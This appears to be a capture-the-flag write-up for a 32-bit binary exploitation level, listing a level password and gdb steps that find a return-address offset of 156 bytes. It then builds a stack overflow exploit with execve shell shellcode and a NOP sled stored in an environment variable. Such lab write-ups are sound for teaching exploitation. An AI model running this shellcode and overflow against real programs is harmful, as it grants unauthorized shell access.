# Level04 - 32 bits -

## Local script usage

Requirements:

- `gdb-peda`
- `getenv32`

You can setup requirements with the script: [scripts/installUtils.sh](../../scripts/installUtils.sh)

```shell
./scripts/installUtils.sh
./level04/Ressources/main.sh
```

## Passwords and token

|         |                                            |
| ------- | ------------------------------------------ |
| level04 | `kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf` |
| level05 | ``                                         |

## Steps to resolve on VM

See our assembly interpretation in [source file](../source.c)

```shell
pattern create 200 input
run < <(cat /tmp/input)
  Invalid $PC address: 0x71414154
  Stopped reason: SIGSEGV
  0x71414154 in ?? ()

pattern search
  EIP+0 found at offset: 156

python -c 'print "A" * 156 + "BBBB"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

x/x $esp+0x20 # buf
0xffffd660:     0x080482e0

SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * (156-100-23) + "\xe0\x82\x04\x08"'


export SHELLCODE=`python -c "print '\x90' * 0xff + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`

./getenv32 SHELLCODE ~/level04
0xffffd755
python -c 'print "A" * 156 + "\x55\xd7\xff\xff"' > /tmp/exploit04

p /x 0xffffd755 + 100
$2 = 0xffffd7b9

python -c 'print "A" * 156 + "\xb9\xd7\xff\xff"' > /tmp/exploit04
```

## Sources

### ASM

- [What does the “rep stos” x86 assembly instruction sequence do?](https://stackoverflow.com/questions/3818856/what-does-the-rep-stos-x86-assembly-instruction-sequence-do)

### C

- [Man fork](https://linux.die.net/man/3/fork)
- [Man gets](https://linux.die.net/man/3/gets)
- [Man kill](https://linux.die.net/man/3/kill)
- [Man memset](https://linux.die.net/man/3/memset)
- [Man prctl](https://linux.die.net/man/2/prctl)
- [Man ptrace](https://linux.die.net/man/2/ptrace)
- [Man puts](https://linux.die.net/man/3/puts)
- [Man wait](https://linux.die.net/man/2/wait)
